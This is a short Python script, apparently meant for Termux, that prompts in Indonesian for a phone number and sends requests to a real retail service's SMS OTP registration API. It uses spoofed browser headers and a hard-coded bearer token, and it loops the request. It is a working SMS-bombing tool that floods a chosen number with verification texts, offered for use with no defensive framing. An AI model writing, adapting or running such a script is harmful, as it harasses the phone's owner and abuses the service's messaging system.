import os,sys,time,requests,json
from os import system
from time import sleep

system("clear")



number = input("masukan nomor : ")

headers = {
"Origin":"https://www.mapclub.com",
"Accept":"application/json, text/plain, */*",
"Accept-Language":"en-US",
"Authorization":"BearereyJhbGciOiJIUZUxMiJ9.eyJndWVzdENvZGUiOilOZDcwYjk5YS0xODUXLTQ4MjgtODU2Mi02M2FKM2FIN2MONJEILCJleHBpcmVkljoxNjk4NDQxODEzMjI4LCJleHBpcmUiOjM2MDAsImV4cC16MTY5ODQ0MTgxMywiaWF0IjoxNjk4NDM4MjEzLCJwbGF0Zm9ybSl6lldFQiJ9.huHZzYienE_XaNVpBkyzSm3lRxuZofOn2pILrQTjenLR2GrdTdSar62-dV32_6hrlGv2bjk1xuySkoQcLkywQQ",
"Client-Platform":"WEB",
"Client-Timestamp":"1698438210723",
"Content-Length":"25",
"Content-Type":"application/json",
"Referer":"https://www.mapclub.com/",
"Sec-Ch-Ua-Mobile":"?1",
"Sec-Ch-Ua-Platform":"Android",
"Sec-Fetch-Dest":"empty",
"Sec-Fetch-Mode":"cors",
"Sec-Fetch-Site":"same-site",
"User-Agent":"Mozilla/5.0 (Linux, Android 10; K) AppleWebkit/537.36 (KHTML, like Gecko)Chrome/116.0.0.0 Mobile Safari/537.36",
"Accept-Encoding":"gzip,deflate, br",
}

data = json.dumps({"account":number})

for i in range(1,2 + 1):
    post = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp?channel-SMS",headers=headers,data=data) #ini gabungan headers sama data yang akan di proses oleh perintah termux
    print (post)
